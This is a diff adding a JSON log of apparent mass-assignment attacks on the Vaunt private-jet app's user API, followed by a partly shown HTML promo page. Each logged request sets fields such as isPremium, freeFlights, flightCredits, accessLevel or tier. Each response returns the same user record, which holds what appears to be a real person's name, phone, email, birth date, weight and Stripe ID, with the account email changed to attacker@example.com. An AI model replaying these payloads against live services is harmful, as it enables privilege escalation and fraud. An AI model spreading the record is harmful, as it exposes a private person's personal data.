+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    },
+    {
+      "category": "user_manipulation",
+      "test": "Manipulate isPremium",
+      "payload": {
+        "isPremium": true
+      },
+      "status": 200,
+      "response": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363640422,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    },
+    {
+      "category": "user_manipulation",
+      "test": "Manipulate freeFlights",
+      "payload": {
+        "freeFlights": 10
+      },
+      "status": 200,
+      "response": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363640790,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    },
+    {
+      "category": "user_manipulation",
+      "test": "Manipulate flightCredits",
+      "payload": {
+        "flightCredits": 100
+      },
+      "status": 200,
+      "response": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363641122,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    },
+    {
+      "category": "user_manipulation",
+      "test": "Manipulate accessLevel",
+      "payload": {
+        "accessLevel": 99
+      },
+      "status": 200,
+      "response": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363641449,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    },
+    {
+      "category": "user_manipulation",
+      "test": "Manipulate accountType",
+      "payload": {
+        "accountType": "corporate"
+      },
+      "status": 200,
+      "response": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363641773,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    },
+    {
+      "category": "user_manipulation",
+      "test": "Manipulate tier",
+      "payload": {
+        "tier": "premium"
+      },
+      "status": 200,
+      "response": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363642085,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    },
+    {
+      "category": "user_manipulation",
+      "test": "Manipulate level",
+      "payload": {
+        "level": "unlimited"
+      },
+      "status": 200,
+      "response": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363642440,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    }
+  ],
+  "vulnerabilities": [
+    {
+      "type": "INFO - Referral Endpoint Found",
+      "endpoint": "/v1/promo",
+      "status": 200,
+      "response": {
+        "raw_text": "<!DOCTYPE html>\n<html>\n  <head>\n    <title>Vaunt API</title>\n\n    <!-- Viewport mobile tag for sensible mobile support -->\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\">\n\n    \n    <meta name=\"robots\" content=\"noindex\"> \n\n\n    <!--\n        Stylesheets and Preprocessors\n        ==============================\n\n        You can always bring in CSS files manually with `<link>` tags, or asynchronously\n        using a solution like AMD (RequireJS).  Or, if you like, you can take advantage\n        of Sails' conventional asset pipeline (boilerplate Gruntfile).\n\n        By default, stylesheets from your `assets/styles` folder are included\n        here automatically (between STYLES and STYLES END). Both CSS (.css) and LESS (.less)\n        are supported. In production, your styles will be minified and concatenated into\n        a single file.\n\n        To customize any part of the built-in behavior, just edit `tasks/pipeline.js`.\n        For example, here are a few things you could do:\n\n            + Change the order of your CSS files\n            + Import stylesheets from other directories\n            + Use a different or additional preprocessor, like SASS, SCSS or Stylus\n    -->\n\n    <!--STYLES-->\n    <link rel=\"stylesheet\" href=\"/dist/production.min.0f2e02f9.css\">\n    <!--STYLES END-->\n  </head>\n\n  <body>\n    <!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\">\n  <title>Join the Flying High Society - Vaunt</title>\n  <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n  <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n  <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap\" rel=\"stylesheet\">\n  <style>\n    @font-face {\n      font-family: 'Union';\n      src: url('https://fonts.cdnfonts.com/css/union') format('woff2');\n      font-weight: 400;\n      font-style: normal;\n    }\n\n    @font-face {\n      font-family: 'Union';\n      src: url('https://fonts.cdnfonts.com/css/union') format('woff2');\n      font-weight: 700;\n      font-style: normal;\n    }\n\n    * {\n      margin: 0;\n      padding: 0;\n      box-sizing: border-box;\n    }\n\n    body, html {\n      width: 100%;\n      height: 100%;\n      margin: 0;\n      padding: 0;\n      font-family: 'Union', 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;\n      -webkit-font-smoothing: antialiased;\n      -moz-osx-font-smoothing: grayscale;\n      overflow-x: hidden;\n      /* Prevent pull-to-refresh and overscroll on mobile */\n      overscroll-behavior: none;\n      -webkit-overflow-scrolling: touch;\n    }\n\n    .container {\n      position: relative;\n      width: 100%;\n      min-height: 100vh;\n      min-height: -webkit-fill-available;\n      display: flex;\n      flex-direction: column;\n      align-items: center;\n      justify-content: space-between;\n      padding: 72px 20px 40px;\n      overflow-y: auto;\n      overflow-x: hidden;\n    }\n\n    /* Background image - center crop */\n    .background {\n      position: fixed;\n      top: 0;\n      left: 0;\n      width: 100%;\n      height: 100%;\n      background-image: url('/images/promo.jpg');\n      background-size: cover;\n      background-position: center center;\n      background-repeat: no-repeat;\n      background-attachment: fixed;\n      z-index: -1;\n    }\n\n    /* Mask group - decorative waves at bottom */\n    .mask-group {\n      position: fixed;\n      bottom: 0;\n      left: 0;\n      width: 100%;\n      height: 50vh;\n      z-index: 0;\n      pointer-events: none;\n    }\n\n    .mask-group img {\n      width: 100%;\n      height: 100%;\n      display: block;\n      object-fit: fill;\n      object-position: bottom;\n    }\n\n    /*!* Gradient overlay *!*/\n    /*.background::after {*/\n    /*  content: '';*/\n    /*  position: absolute;*/\n    /*  top: 0;*/\n    /*  left: 0;*/\n    /*  right: 0;*/\n    /*  bottom: 0;*/\n    /*  background: linear-gradient(to bottom, rgba(255,255,255,0.3) 0%, rgba(255,255,255,0.5) 100%);*/\n    /*}*/\n\n    /* Header */\n    .header {\n      position: relative;\n      text-align: center;\n      z-index: 1;\n      flex-shrink: 0;\n    }\n\n    .title {\n      font-family: 'Union', sans-serif;\n      font-size: 36px;\n      font-weight: 400;\n      line-height: 1.2;\n      letter-spacing: -0.8px;\n      color: #3E5567;\n      max-width: 100%;\n      margin: 0 auto 12px;\n      text-align: center;\n      padding: 0 10px;\n    }\n\n    .underline {\n      width: 100%;\n      max-width: 280px;\n      height: 1px;\n      background: linear-gradient(90deg, rgba(255, 255, 255, 0) 0%, #FF6501 65%);\n      margin: 0 auto 20px;\n    }\n\n    .offer-text {\n      font-family: 'Union', sans-serif;\n      font-size: 15px;\n      font-weight: 400;\n      line-height: 1.4;\n      letter-spacing: -0.32px;\n      color: #54616E;\n      margin-bottom: 12px;\n      text-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);\n    }\n\n    .call-text {\n      font-family: 'Union', sans-serif;\n      font-size: 12px;\n      font-weight: 400;\n      line-height: 1.5;\n      letter-spacing: -0.24px;\n      color: #54616E;\n      max-width: 280px;\n      margin: 0 auto;\n      text-align: center;\n      padding: 0 10px;\n      text-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);\n    }\n\n    .phone-number-link {\n      text-decoration: none;\n      cursor: pointer;\n      display: inline;\n    }\n\n    .phone-number {\n      background: linear-gradient(180deg, #FF9900 0%, #FF9900 60%, #FF4D00 100%);\n      -webkit-background-clip: text;\n      -webkit-text-fill-color: transparent;\n      background-clip: text;\n      font-weight: 700;\n      text-decoration: none;\n    }\n\n    .phone-number-link:hover .phone-number {\n      opacity: 0.8;\n    }\n\n    .phone-number-link:active .phone-number {\n      opacity: 0.6;\n    }\n\n    /* Benefits card */\n    .benefits-card {\n      position: relative;\n      background: rgba(255, 255, 255, 0.65);\n      backdrop-filter: blur(8px);\n      -webkit-backdrop-filter: blur(8px);\n      border-radius: 20px;\n      padding: 24px;\n      max-width: 100%;\n      width: 100%;\n      display: flex;\n      flex-direction: column;\n      gap: 16px;\n      z-index: 1;\n      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);\n      margin-top: 40px;\n      flex-shrink: 0;\n    }\n\n    .benefit-item {\n      display: flex;\n      flex-direction: column;\n      gap: 8px;\n    }\n\n    .benefit-title {\n      font-family: 'Union', sans-serif;\n      font-size: 16px;\n      font-weight: 700;\n      line-height: 1.3;\n      letter-spacing: -0.32px;\n      background:  linear-gradient(180deg, #FF9900 0%, #FF4D00 100%);\n      -webkit-background-clip: text;\n      -webkit-text-fill-color: transparent;\n      background-clip: text;\n    }\n\n    .benefit-description {\n      font-family: 'Union', sans-serif;\n      font-size: 14px;\n      font-weight: 400;\n      line-height: 1.5;\n      letter-spacing: -0.28px;\n      color: #54616E;\n    }\n\n    /* Mobile optimization - default styles are mobile-first */\n    @media (max-width: 393px) {\n      .container {\n        padding: 60px 16px 32px;\n      }\n\n      .title {\n        font-size: 32px;\n      }\n\n      .benefits-card {\n        padding: 20px;\n        margin-top: 32px;\n      }\n    }\n\n    /* Small mobile devices */\n    @media (max-width: 375px) {\n      .container {\n        padding: 50px 16px 28px;\n      }\n\n      .title {\n        font-size: 28px;\n      }\n\n      .offer-text {\n        font-size: 14px;\n      }\n\n      .benefits-card {\n        padding: 18px;\n        gap: 14px;\n        margin-top: 28px;\n      }\n    }\n\n    /* Larger screens */\n    @media (min-width: 768px) {\n      .container {\n        padding: 80px 40px 60px;\n        max-width: 500px;\n        margin: 0 auto;\n      }\n\n      .title {\n        font-size: 44px;\n        max-width: 450px;\n      }\n\n      .benefits-card {\n        max-width: 100%;\n        padding: 28px;\n      }\n    }\n  </style>\n</head>\n<body>\n  <!-- Background image with center crop -->\n  <div class=\"background\"></div>\n\n  <!-- Decorative wave pattern at bottom -->\n  <div class=\"mask-group\">\n    <img src=\"/images/mask_group.png\" alt=\"\">\n  </div>\n\n  <div class=\"container\">\n    <!-- Header -->\n    <div class=\"header\">\n      <h1 class=\"title\">Join the Flying High Society</h1>\n      <div class=\"underline\"></div>\n      <p class=\"offer-text\">Limited-time offer ends today!</p>\n      <p class=\"call-text\">\n        Call <a href=\"tel:+19452219374\" class=\"phone-number-link\"><span class=\"phone-number\">(945) 221-9374</span></a> to speak with our Concierge Team to redeem offer.\n      </p>\n    </div>\n\n    <!-- Benefits card -->\n    <div class=\"benefits-card\">\n      \n        <div class=\"benefit-item\">\n          <div class=\"benefit-title\">Unlimited Flights</div>\n          <div class=\"benefit-description\">Unlimited flights throughout the year with one annual membership. That&#39;s right. There are no restrictions on the number of flights you can take, so fly as often as you want.</div>\n        </div>\n      \n        <div class=\"benefit-item\">\n          <div class=\"benefit-title\">Truly Private</div>\n          <div class=\"benefit-description\">When you reserve a flight, the plane is entirely yours. Fly solo or invite your friends, family, and pets aboard for an unforgettable adventure.</div>\n        </div>\n      \n        <div class=\"benefit-item\">\n          <div class=\"benefit-title\">Elevated Experience</div>\n          <div class=\"benefit-description\">Indulge in the magic of private jet travel - from concierge service to instant boarding - with an elevated experience 